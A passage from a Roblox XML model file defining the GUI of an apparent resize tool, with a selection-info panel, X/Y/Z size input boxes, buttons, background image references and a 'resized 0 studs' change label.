									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Info</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>60</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXCEBDFF51F32D413A95C2DD925962F33D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278497260</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXA330CBB1492F4873AAB6C7F3A944A9B3">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">SELECTION INFO</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXC1DBD44944074DC3A50DCFEF87E77979">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">SizeInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXEA20FCEE610C4F698ECB9765031C2AD9">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>75</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Size</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX0E64AEACCB344B48AC64BFBBDE35EDFD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">X</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>70</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBX7105ED7991A54A6B9C98D85784EE9942">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBXC9F5F85FF2C949C593FA3B6633D11EA4">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBX0945487A98F2428A8FC5711471D4D8E3">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX3688231056704DD1820DE596FF8F7687">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Y</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>117</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBX994BA917C6264FC3B579F31546D52F21">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBX5C596A568D66494CAA1AC450E524F65F">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBX137B5EC3DA0646569B4C271CE45B3D10">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBXBFB8855365D84E119B7A6AF7EE06D1A1">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Z</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>164</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBX0EFC734C1A644B37B309A3DE4BD0965F">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBX25FB8152CE214E7EB8051041B5CC3E2F">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBX5E0F370798194F8A9C25D4913D72FE7C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXE20B35034F2148A2BB4E6B2DC816600D">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Changes</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX9E7ECF2298634056921E10A5442BB14D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278497260</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX3A73716039E7429984BA957083E3C4B7">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">resized 0 studs</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
